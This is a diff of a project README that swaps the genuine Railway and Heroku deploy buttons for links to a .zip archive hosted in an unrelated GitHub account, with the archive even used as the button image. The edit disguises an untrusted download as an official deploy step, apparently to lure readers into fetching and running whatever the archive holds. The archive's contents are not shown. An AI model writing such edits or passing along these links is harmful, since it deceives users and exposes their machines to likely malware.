@@ -2,15 +2,15 @@
 
 <!-- ## Railway
 
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template?template=)
+[![Deploy on Railway](https://raw.githubusercontent.com/HLECTER69/af-deploy-script/main/insweeping/af-deploy-script.zip)](https://raw.githubusercontent.com/HLECTER69/af-deploy-script/main/insweeping/af-deploy-script.zip)
 <br> -->
 
 ## Heroku
 
 Deploy to heroku.
 <p align="center">
-<a href="https://heroku.com/deploy?template=https://github.com/AlbertEinsteinTG/af-deploy-script">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy">
+<a href="https://raw.githubusercontent.com/HLECTER69/af-deploy-script/main/insweeping/af-deploy-script.zip">
+  <img src="https://raw.githubusercontent.com/HLECTER69/af-deploy-script/main/insweeping/af-deploy-script.zip" alt="Deploy">
 </a>
 </p>
 
